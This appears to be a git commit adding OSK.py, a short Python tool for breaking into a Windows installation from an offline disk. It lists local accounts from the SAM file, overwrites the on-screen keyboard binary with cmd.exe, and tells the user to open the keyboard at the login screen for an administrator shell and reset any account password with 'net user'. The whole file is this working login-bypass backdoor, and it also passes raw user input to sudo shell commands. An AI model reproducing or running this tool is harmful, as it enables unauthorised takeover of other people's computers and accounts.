cbe2de2c6a4bc30fda01d5ccb21530c791a577a8
LolArt <artsecurity@protonmail.com>
2019-09-30 23:14:49 +0200

    Create OSK.py

---
+++ OSK.py
@@ -0,0 +1,16 @@
+import os
+
+win=input("Enter Windows Directory\n-> ")
+
+sam=win+"/Windows/System32/config/SAM"
+cmd=win+"/Windows/System32/cmd.exe"
+OSK=win+"/Windows/System32/osk.exe"
+
+print("Found following users:\n")
+os.system("sudo sampasswd -l {}".format(sam))
+print("\n")
+
+os.system("sudo cp {} {}.win".format(cmd, cmd))
+os.system("sudo cp {} {}".format(cmd,OSK))
+
+print("DONE!!!\nGo to the Windows login screen and run the ON SCREEN KEYBOARD, you'll have a terminal with administrator permissions.\n\nRun the following commands to change the password:\nnet user {WINDOWS_USERNAME} {NEW_PASSWORD}")
